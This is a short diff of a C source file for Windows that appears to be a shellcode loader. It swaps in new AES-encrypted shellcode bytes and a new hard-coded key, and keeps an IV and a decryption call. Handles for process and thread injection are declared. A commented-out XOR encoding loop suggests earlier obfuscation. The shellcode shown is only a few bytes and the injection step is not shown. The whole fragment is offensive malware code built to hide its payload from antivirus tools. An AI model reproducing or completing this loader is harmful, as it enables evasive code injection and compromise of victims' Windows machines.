@@ -2,13 +2,13 @@
 #include <string.h>
 #include <Windows.h>
 #include "aes.h"
-
+#define CTR 1
 int main(int argc, char* argv[]){
     DWORD pid=0;
     DWORD tid=0;
     HANDLE hprocess,hthread=NULL;
     LPVOID base =NULL;
-    uint8_t shellcode[] = "\x2e\xfe\x72\x19\xe1\x48\xe3\x37\xb4\x37\x1f\x95\x84\xcc\xf4";
+    uint8_t shellcode[] = "\x9e\x45\xab\x7e\xfd\x23\x1d\x70\xaa\x2c\x4e\x30\xa9\xb2\x9b";
     /*int i;
     char key = '!';
     for ( i = 0; i < sizeof(shellcode)-1; i++)
@@ -17,7 +17,7 @@ int main(int argc, char* argv[]){
     }
     */
    struct AES_ctx ctx;
-   uint8_t key[] = "1@_2wa&^r4";
+   uint8_t key[] = "@yj$4(bM3geUA$WT";
    uint8_t iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx,shellcode,sizeof(shellcode));
